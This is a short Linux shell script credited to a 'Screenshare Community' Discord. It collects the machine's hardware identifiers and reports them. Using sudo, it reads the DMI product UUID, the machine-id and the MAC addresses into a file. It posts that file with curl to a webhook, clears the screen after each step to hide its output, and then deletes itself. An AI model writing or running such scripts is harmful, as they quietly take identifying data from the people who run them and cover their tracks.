#Performed by Screenshare Community! discord.gg/screenshare
#RRR#0001


sudo apt install net-tools
clear
cd ~/Desktop
clear
sudo cat /sys/class/dmi/id/product_uuid > HWID.txt
clear
sudo cat /etc/machine-id >> HWID.txt
clear
ifconfig -a | grep ether >> HWID.txt
clear
curl -H "Accept: application/json" -H "Content-Type:multipart/form-data" -X POST -F "file=@HWID.txt" -F "payload_json={\"content\":\"$USER HWID (linux)\"}" webhook
clear
zenity --info --window-icon=info --title="HWID" --text="HWID was extracted successfully!"
rm -- "$0"
